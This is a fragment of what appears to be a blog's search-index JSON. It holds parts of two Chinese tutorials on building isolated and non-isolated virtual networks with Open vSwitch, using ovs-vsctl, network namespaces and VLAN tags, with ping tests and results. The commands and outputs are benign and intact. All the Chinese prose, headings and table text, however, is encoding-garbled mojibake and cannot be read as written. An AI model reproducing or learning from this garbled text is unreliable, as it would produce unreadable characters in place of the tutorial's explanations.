set Port vnet1 tag=200 æµ‹è¯• æµ‹è¯• ä¸»æœºA ip netns exec ns0 ping 10.0.0.3 ip netns exec ns0 ping 10.0.0.4 ip netns exec ns1 ping 10.0.0.3 ip netns exec ns1 ping 10.0.0.4 æµ‹è¯• ä¸»æœºB ip netns exec ns0 ping 10.0.0.1 ip netns exec ns0 ping 10.0.0.2 ip netns exec ns1 ping 10.0.0.1 ip netns exec ns1 ping 10.0.0.2 æµ‹è¯•ç»“æœ ä¸»æœºA ä¸»æœºB ping ç»“æœ ns0 ns0 å¯é€šä¿¡ âœ… ns0 ns1 ä¸é€šä¿¡ âŒ ns1 ns0 ä¸é€šä¿¡ âŒ ns1 ns1 å¯é€šä¿¡ âœ… æ ¹æ®æµ‹è¯•ç»“æœå¯ä»¥çœ‹åˆ°æˆ‘ä»¬ä½¿ç”¨OVSæˆåŠŸçš„éš”ç¦»äº†åˆ†å¸ƒåœ¨ä¸åŒä¸»æœºä¸Šçš„è™šæ‹Ÿç½‘ç»œè®¾å¤‡ã€‚\n","permalink":"https://www.typesafe.cn/posts/ovs-learn-3/","summary":"\u003ch1 id=\"ä½¿ç”¨ovsæ„å»ºåˆ†å¸ƒå¼éš”ç¦»ç½‘ç»œ\"\u003eä½¿ç”¨OVSæ„å»ºåˆ†å¸ƒå¼éš”ç¦»ç½‘ç»œ\u003c/h1\u003e\n\u003ch2 id=\"å‰è¨€\"\u003eå‰è¨€\u003c/h2\u003e\n\u003cp\u003eä¸Šä¸€èŠ‚æˆ‘ä»¬ä½¿ç”¨OVSæ„å»ºäº†å•æœºéš”ç¦»ç½‘ç»œï¼Œä½†æ˜¯éšç€ç½‘ç»œè§„æ¨¡çš„æ‰©å¼ ï¼Œå•èŠ‚ç‚¹å·²ç»ä¸å†èƒ½æ»¡è¶³ä¸šåŠ¡çš„éœ€è¦ï¼Œåˆ†å¸ƒå¼ç½‘ç»œæˆäº†å¿…ä¸å¯å°‘çš„ç¯èŠ‚ã€‚åˆ†å¸ƒå¼ç½‘ç»œä¸å•èŠ‚ç‚¹ç½‘ç»œåœ¨ç»†èŠ‚å®ç°ä¸ŠåŸºæœ¬ä¸€è‡´ï¼Œåªæœ‰ç‰©ç†ç¯å¢ƒç½‘ç»œè¿çº¿ä¸Šçš„ä¸€ç‚¹åŒºåˆ«ã€‚\u003c/p\u003e\n\u003ch2 id=\"å®éªŒ1åˆ†å¸ƒå¼æ— éš”ç¦»ç½‘ç»œ\"\u003eå®éªŒ1ï¼šåˆ†å¸ƒå¼æ— éš”ç¦»ç½‘ç»œ\u003c/h2\u003e\n\u003cp\u003eç½‘ç»œæ‹“æ‰‘å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œæˆ‘ä»¬æ¯ä¸€å°èŠ‚ç‚¹éƒ½æœ‰ä¸¤å¼ ç½‘å¡ï¼Œä¸€å¼ ç”¨äºç®¡ç†ï¼Œä¸€å¼ ç”¨äºä¸šåŠ¡ã€‚ä¹‹æ‰€ä»¥ä½¿ç”¨ä¸¤å¼ ç½‘å¡æœ‰ä¸¤ä¸ªåŸå› ï¼š\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eç®¡ç†ç½‘å¡ç”¨äºæ—¥å¸¸çš„ç»´æŠ¤ç™»å½•ï¼Œä¸šåŠ¡ç½‘å¡ç”¨äºä¼ è¾“è™šæ‹ŸèŠ‚ç‚¹çš„æ•°æ®æŠ¥æ–‡ï¼Œé¿å…ç›¸äº’ä¹‹é—´å½±å“ã€‚\u003c/li\u003e\n\u003cli\u003eæˆ‘ä»¬è¦å°†ä¸šåŠ¡ç½‘å¡ç»‘å®šåˆ°OVSç½‘æ¡¥ä¸Šï¼Œä¹Ÿå°±æ˜¯\u003ccode\u003eNormal\u003c/code\u003eç±»å‹çš„\u003ccode\u003ePort\u003c/code\u003eã€‚è¿™ç§æ–¹å¼æ·»åŠ çš„\u003ccode\u003ePort\u003c/code\u003eä¸æ”¯æŒåˆ†é…IPåœ°å€ï¼Œå¦‚æœä¹‹å‰ç½‘å¡ä¸Šé…ç½®çš„æœ‰IPï¼ŒæŒ‚è½½åˆ°OVSä¸Šé¢ä¹‹åå°†ä¸å¯è®¿é—®ã€‚\u003c/li\u003e\n\u003c/ol\u003e\n\u003cblockquote\u003e\n\u003cp\u003eéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœæ˜¯ä½¿ç”¨ç‰©ç†ç¯å¢ƒæ­å»ºç½‘ç»œæ‹“æ‰‘ï¼Œéœ€è¦æŠŠä¸šåŠ¡ç½‘å¡å¯¹åº”çš„äº¤æ¢æœºç«¯å£é…ç½®ä¸º\u003ccode\u003etrunk\u003c/code\u003eæ¨¡å¼ã€‚å¦‚æœæ˜¯ä½¿ç”¨VmWareæ­å»ºç½‘ç»œæ‹“æ‰‘ï¼Œä¸šåŠ¡ç½‘å¡éœ€è¦é…ç½®ç½‘ç»œç±»å‹ä¸º\u003ccode\u003eä»…ä¸»æœºæ¨¡å¼\u003c/code\u003eã€‚\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003e\u003cimg alt=\"åˆ†å¸ƒå¼æ— éš”ç¦»ç½‘ç»œ\" loading=\"lazy\" src=\"https://oss.typesafe.cn/ovs-di-network0.png?t=2\"\u003e\u003c/p\u003e\n\u003ch3 id=\"é…ç½®\"\u003eé…ç½®\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eé…ç½®ç¯å¢ƒ \u003ccode\u003eä¸»æœºA\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eovs-vsctl add-br br-int\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# è¯·ä¿®æ”¹eth1ä¸ºå½“å‰å®éªŒç¯å¢ƒçš„ä¸šåŠ¡ç½‘å¡åç§°\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eovs-vsctl add-port br-int eth1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# æ·»åŠ ä¸¤ä¸ªå†…éƒ¨ç«¯å£\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eovs-vsctl add-port br-int vnet0 -- set Interface vnet0 type\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003einternal\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eovs-vsctl add-port br-int vnet1 -- set Interface vnet1 type\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003einternal\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# æ·»åŠ ä¸¤ä¸ªnetns\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eip netns add ns0\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eip netns add ns1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# å°†å†…éƒ¨ç«¯å£åˆ†åˆ«ç§»åŠ¨åˆ°netnsä¸­\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eip link set vnet0 netns ns0\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eip link set vnet1 netns ns1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# å¯åŠ¨ç«¯å£å¹¶é…ç½®IP\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eip netns exec ns0 ip link set lo up\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eip netns exec ns0 ip link set vnet0 up\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eip netns exec ns0 ip addr add 10.0.0.1/24 dev vnet0\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eip netns exec ns1 ip link set lo up\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eip netns exec ns1 ip link set vnet1 up\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eip netns exec ns1 ip addr add 10.0.0.2/24 dev vnet1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eé…ç½®ç¯å¢ƒ \u003ccode\u003eä¸»æœºB\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eovs-vsctl add-br br-int\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# è¯·ä¿®æ”¹eth1ä¸ºå½“å‰å®éªŒç¯å¢ƒçš„ä¸šåŠ¡ç½‘å¡åç§°\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eovs-vsctl add-port br-int eth1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# æ·»åŠ ä¸¤ä¸ªå†…éƒ¨ç«¯å£\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eovs-vsctl add-port br-int vnet0 -- set Interface vnet0 type\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003einternal\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eovs-vsctl add-port br-int vnet1 -- set Interface vnet1 type\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003einternal\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# æ·»åŠ ä¸¤ä¸ªnetns\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eip netns add ns0\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eip netns add ns1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# å°†å†…éƒ¨ç«¯å£åˆ†åˆ«ç§»åŠ¨åˆ°netnsä¸­\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eip link set vnet0 netns ns0\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eip link set vnet1 netns ns1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# å¯åŠ¨ç«¯å£å¹¶é…ç½®IP\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eip netns exec ns0 ip link set lo up\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eip netns exec ns0 ip link set vnet0 up\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eip netns exec ns0 ip addr add 10.0.0.3/24 dev vnet0\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eip netns exec ns1 ip link set lo up\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eip netns exec ns1 ip link set vnet1 up\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eip netns exec ns1 ip addr add 10.0.0.4/24 dev vnet1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"æµ‹è¯•\"\u003eæµ‹è¯•\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eæµ‹è¯• \u003ccode\u003eä¸»æœºA\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eip netns exec ns0 ping 10.0.0.3\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eip netns exec ns0 ping 10.0.0.4\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eip netns exec ns1 ping 10.0.0.3\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eip netns exec ns1 ping 10.0.0.4\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eæµ‹è¯• \u003ccode\u003eä¸»æœºB\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eip netns exec ns0 ping 10.0.0.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eip netns exec ns0 ping 10.0.0.2\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eip netns exec ns1 ping 10.0.0.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eip netns exec ns1 ping 10.0.0.2\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eæµ‹è¯•ç»“æœ\u003c/li\u003e\n\u003c/ul\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003eä¸»æœºA\u003c/th\u003e\n          \u003cth\u003eä¸»æœºB\u003c/th\u003e\n          \u003cth\u003eping ç»“æœ\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003ens0\u003c/td\u003e\n          \u003ctd\u003ens0\u003c/td\u003e\n          \u003ctd\u003eå¯é€šä¿¡ âœ…\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003ens0\u003c/td\u003e\n          \u003ctd\u003ens1\u003c/td\u003e\n          \u003ctd\u003eå¯é€šä¿¡ âœ…\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003ens1\u003c/td\u003e\n          \u003ctd\u003ens0\u003c/td\u003e\n          \u003ctd\u003eå¯é€šä¿¡ âœ…\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003ens1\u003c/td\u003e\n          \u003ctd\u003ens1\u003c/td\u003e\n          \u003ctd\u003eå¯é€šä¿¡ âœ…\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e\n\u003cp\u003eæ ¹æ®æµ‹è¯•ç»“æœå¯ä»¥çœ‹åˆ°æˆ‘ä»¬ä½¿ç”¨OVSæˆåŠŸçš„è”é€šäº†åˆ†å¸ƒåœ¨ä¸åŒä¸»æœºä¸Šçš„è™šæ‹Ÿç½‘ç»œè®¾å¤‡ã€‚\u003c/p\u003e","title":"Open vSwitch å…¥é—¨å®è·µï¼ˆ3ï¼‰ä½¿ç”¨OVSæ„å»ºåˆ†å¸ƒå¼éš”ç¦»ç½‘ç»œ"},{"content":"å‰è¨€ åœ¨å‰é¢æˆ‘ä»¬å·²ç»ä½¿ç”¨Linux Bridgeå®Œæˆäº†å¤šå°ç½‘ç»œè®¾å¤‡çš„é€šä¿¡ï¼Œä½†æ˜¯å®ƒå¯¹äºç½‘ç»œéš”ç¦»çš„æ”¯æŒä¸æ˜¯å¾ˆå¥½ï¼Œé•¿æœŸä»¥æ¥ï¼Œåœ¨Linuxå¹³å°ä¸Šç¼ºå°‘ä¸€ä¸ªåŠŸèƒ½å®Œå¤‡çš„è™šæ‹Ÿäº¤æ¢æœºï¼Œç›´åˆ°OVSçš„å‡ºç°ã€‚\nå®éªŒ æ¥ä¸‹æ¥æˆ‘ä»¬æ¥å°è¯•å®Œæˆä¸¤ä¸ªå®éªŒï¼Œå•æœºæ— éš”ç¦»ç½‘ç»œã€å•æœºéš”ç¦»ç½‘ç»œã€‚\nå®éªŒä¸€ï¼šå•æœºæ— éš”ç¦»ç½‘ç»œ ä½¿ç”¨ovsæ„å»ºæ— éš”ç¦»ç½‘ç»œéå¸¸ç®€å•ï¼Œåªéœ€è¦æ·»åŠ ä¸€ä¸ªç½‘æ¡¥ï¼Œç„¶ååœ¨è¿™ä¸ªç½‘æ¡¥ä¸Šå†å¢åŠ å‡ ä¸ªå†…éƒ¨ç«¯å£ï¼Œæœ€åæŠŠç«¯å£ç§»åŠ¨åˆ°netnsä¸­å³å¯ã€‚\n# æ·»åŠ ç½‘æ¡¥ ovs-vsctl add-br br-int # æ·»åŠ ä¸‰ä¸ªå†…éƒ¨ç«¯å£ ovs-vsctl add-port br-int vnet0 -- set Interface vnet0 type=internal ovs-vsctl add-port br-int vnet1 -- set Interface vnet1 type=internal ovs-vsctl add-port br-int vnet2 -- set Interface vnet2 type=internal # æ·»åŠ ä¸‰ä¸ªnetns ip netns add ns0 ip netns add ns1 ip netns add ns2 # å°†å†…éƒ¨ç«¯å£åˆ†åˆ«ç§»åŠ¨åˆ°netnsä¸­ ip link set vnet0 netns ns0 ip link set vnet1 netns ns1 ip link set vnet2 netns ns2 # å¯åŠ¨ç«¯å£å¹¶é…ç½®IP ip netns exec ns0 ip link set lo up ip netns exec ns0 ip link set vnet0 up ip netns exec ns0 ip addr add 10.0.0.1/24 dev vnet0 ip netns exec ns1 ip link set lo up ip netns exec ns1 ip link set vnet1 up ip netns exec ns1 ip addr add 10.0.0.2/24 dev vnet1 ip netns exec ns2 ip link set lo up ip netns exec ns2 ip link set vnet2 up ip netns exec ns2 ip addr add 10.0.0.3/24 dev vnet2 æµ‹è¯•\næµ‹è¯•ns0å’Œns1èƒ½å¦é€šä¿¡ip netns exec ns0 ping 10.0.0.2\nPING 10.0.0.2 (10.0.0.2) 56(84) bytes of data. 64 bytes from 10.0.0.2: icmp_seq=1 ttl=64 time=1.05 ms 64 bytes from 10.0.0.2: icmp_seq=2 ttl=64 time=0.059 ms 64 bytes from 10.0.0.2: icmp_seq=3 ttl=64 time=0.056 ms 64 bytes from 10.0.0.2: icmp_seq=4 ttl=64 time=0.053 ms ^C --- 10.0.0.2 ping statistics --- 4 packets transmitted, 4 received, 0% packet loss, time 3000ms rtt min/avg/max/mdev = 0.053/0.304/1.051/0.431 ms æµ‹è¯•ns0å’Œns2èƒ½å¦é€šä¿¡ip netns exec ns0 ping 10.0.0.3\nPING 10.0.0.3 (10.0.0.3) 56(84) bytes of data. 64 bytes from 10.0.0.3: icmp_seq=1 ttl=64 time=1.17 ms 64 bytes from 10.0.0.3: icmp_seq=2 ttl=64 time=0.067 ms 64 bytes from 10.0.0.3: icmp_seq=3 ttl=64 time=0.058 ms 64 bytes from 10.0.0.3: icmp_seq=4 ttl=64 time=0.064 ms ^C --- 10.0.0.3 ping statistics --- 4 packets transmitted, 4 received, 0% packet loss, time 3001ms rtt min/avg/max/mdev = 0.058/0.341/1.177/0.482 ms æ ¹æ®æµ‹è¯•ç»“æœå¯ä»¥çœ‹åˆ°ï¼Œä¸‰å°è®¾å¤‡éƒ½æ˜¯å¯ä»¥äº’ç›¸è®¿é—®çš„ï¼Œè¿™æ ·æˆ‘ä»¬å°±æˆåŠŸæ­å»ºäº†ä¸€ä¸ªæ— éš”ç¦»çš„äºŒå±‚äº’é€šç½‘ç»œã€‚\nå®éªŒäºŒï¼š å•æœºéš”ç¦»ç½‘ç»œ ä½¿ç”¨ovsæ„å»ºéš”ç¦»ç½‘ç»œä¹Ÿå¾ˆç®€å•ï¼Œåªéœ€è¦ç»™ç›¸åº”çš„ç«¯å£è®¾ç½®ä¸ŠVLANæ ‡ç­¾ï¼Œå°±èƒ½å®ç°ç½‘ç»œçš„éš”ç¦»ã€‚\n# è®¾ç½®vnet0çš„VLAN tagä¸º100 ovs-vsctl set Port vnet0 tag=100 # è®¾ç½®vnet1å’Œvnet2çš„VLAN tagä¸º200 ovs-vsctl set Port vnet1 tag=200 ovs-vsctl set Port vnet2 tag=200 ä½¿ç”¨ovs-vsctl showå‘½ä»¤æŸ¥çœ‹VLAN tagæ˜¯å¦é…ç½®æˆåŠŸ\n90139c71-8d11-49b2-b44c-f34174259dc8 Bridge br-int Port \u0026#34;vnet0\u0026#34; tag: 100 Interface \u0026#34;vnet0\u0026#34; type: internal Port br-int Interface br-int type: internal Port \u0026#34;vnet2\u0026#34; tag: 200 Interface \u0026#34;vnet2\u0026#34; type: internal Port \u0026#34;vnet1\u0026#34; tag: 200 Interface \u0026#34;vnet1\u0026#34; type: internal ovs_version: \u0026#34;2.9.0\u0026#34; æµ‹è¯•\næµ‹è¯•ns0ä¸ns1çš„èƒ½å¦é€šä¿¡ ip netns exec ns0 ping 10.0.0.2\nPING 10.0.0.2 (10.0.0.2) 56(84) bytes of data. ^C --- 10.0.0.2 ping statistics --- 2 packets transmitted, 0 received, 100% packet loss, time 1000ms æµ‹è¯•ns0ä¸ns2çš„èƒ½å¦é€šä¿¡ ip netns exec ns0 ping 10.0.0.3\nPING 10.0.0.3 (10.0.0.3) 56(84) bytes of data. ^C --- 10.0.0.3 ping statistics --- 2 packets transmitted, 0 received, 100% packet loss, time 999ms æµ‹è¯•ns1ä¸ns2çš„èƒ½å¦é€šä¿¡ ip netns exec ns1 ping 10.0.0.3\nPING 10.0.0.3 (10.0.0.3) 56(84) bytes of data. 64 bytes from 10.0.0.3: icmp_seq=1 ttl=64 time=0.930 ms 64 bytes from 10.0.0.3: icmp_seq=2 ttl=64 time=0.057 ms 64 bytes from 10.0.0.3: icmp_seq=3 ttl=64 time=0.056 ms 64 bytes from 10.0.0.3: icmp_seq=4 ttl=64 time=0.057 ms ^C --- 10.0.0.3 ping statistics --- 4 packets transmitted, 4 received, 0% packet loss, time 3000ms rtt min/avg/max/mdev = 0.056/0.275/0.930/0.378 ms æµ‹è¯•ns2ä¸ns1çš„èƒ½å¦é€šä¿¡ ip netns exec ns2 ping 10.0.0.2\nPING 10.0.0.2 (10.0.0.2) 56(84) bytes of data. 64 bytes from 10.0.0.2: icmp_seq=1 ttl=64 time=0.088 ms 64 bytes from 10.0.0.2: icmp_seq=2 ttl=64 time=0.057 ms 64 bytes from 10.0.0.2: icmp_seq=3 ttl=64 time=0.050 ms 64 bytes from 10.0.0.2: icmp_seq=4 ttl=64 time=0.060 ms ^C --- 10.0.0.2 ping statistics --- 4 packets transmitted, 4 received, 0% packet loss, time 2999ms rtt min/avg/max/mdev = 0.050/0.063/0.088/0.017 ms æ ¹æ®æµ‹è¯•ç»“æœå¯ä»¥çœ‹å‡ºï¼Œns0æ˜¯æ— æ³•è®¿é—®åˆ°ns1å’Œns2çš„ï¼Œns1å’Œns2å¯ä»¥äº’ç›¸è®¿é—®ã€‚è¿™æ˜¯å› ä¸ºç«¯å£vnet0çš„æ•°æ®æŠ¥æ–‡å‘å‡ºåè¢«OVSä¿®æ”¹äº†åŒ…å¤´ï¼Œå¢åŠ äº†VLAN 100æ ‡ç­¾ï¼Œä¸vnet1ã€vnet2çš„VLAN 200æ ‡ç­¾ä¸åŒ¹é…ï¼ŒOVSäº¤æ¢æœºä¾¿ä¸å†å°†vnet0çš„æ•°æ®æŠ¥æ–‡å‘é€ç»™å…¶ä»–ä¸¤ä¸ªç«¯å£ï¼Œç”±æ­¤ä¾¿å®ç°äº†ç½‘ç»œéš”ç¦»ã€‚\næ¸…ç†å®éªŒç¯å¢ƒ\novs-vsctl del-br br-int ip netns del ns0 ip netns del ns1 ip netns del ns2 ","permalink":"https://www.typesafe.cn/posts/ovs-learn-2/","summary":"\u003ch1 id=\"å‰è¨€\"\u003eå‰è¨€\u003c/h1\u003e\n\u003cp\u003eåœ¨å‰é¢æˆ‘ä»¬å·²ç»ä½¿ç”¨Linux Bridgeå®Œæˆäº†å¤šå°ç½‘ç»œè®¾å¤‡çš„é€šä¿¡ï¼Œä½†æ˜¯å®ƒå¯¹äºç½‘ç»œéš”ç¦»çš„æ”¯æŒä¸æ˜¯å¾ˆå¥½ï¼Œé•¿æœŸä»¥æ¥ï¼Œåœ¨Linuxå¹³å°ä¸Šç¼ºå°‘ä¸€ä¸ªåŠŸèƒ½å®Œå¤‡çš„è™šæ‹Ÿäº¤æ¢æœºï¼Œç›´åˆ°OVSçš„å‡ºç°ã€‚\u003c/p\u003e\n\u003ch1 id=\"å®éªŒ\"\u003eå®éªŒ\u003c/h1\u003e\n\u003cp\u003eæ¥ä¸‹æ¥æˆ‘ä»¬æ¥å°è¯•å®Œæˆä¸¤ä¸ªå®éªŒï¼Œå•æœºæ— éš”ç¦»ç½‘ç»œã€å•æœºéš”ç¦»ç½‘ç»œã€‚\u003c/p\u003e\n\u003ch2 id=\"å®éªŒä¸€å•æœºæ— éš”ç¦»ç½‘ç»œ\"\u003eå®éªŒä¸€ï¼šå•æœºæ— éš”ç¦»ç½‘ç»œ\u003c/h2\u003e\n\u003cp\u003eä½¿ç”¨ovsæ„å»ºæ— éš”ç¦»ç½‘ç»œéå¸¸ç®€å•ï¼Œåªéœ€è¦æ·»åŠ ä¸€ä¸ªç½‘æ¡¥ï¼Œç„¶ååœ¨è¿™ä¸ªç½‘æ¡¥ä¸Šå†å¢åŠ å‡ ä¸ªå†…éƒ¨ç«¯å£ï¼Œæœ€åæŠŠç«¯å£ç§»åŠ¨åˆ°netnsä¸­å³å¯ã€‚\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# æ·»åŠ ç½‘æ¡¥\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eovs-vsctl add-br br-int\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# æ·»åŠ ä¸‰ä¸ªå†…éƒ¨ç«¯å£\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eovs-vsctl add-port br-int vnet0 -- set Interface vnet0 type\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003einternal\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eovs-vsctl add-port br-int vnet1 -- set Interface vnet1 type\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003einternal\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eovs-vsctl add-port br-int vnet2 -- set Interface vnet2 type\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003einternal\n\u003c/span\u003e\u003c/span\u003e\u003cspan 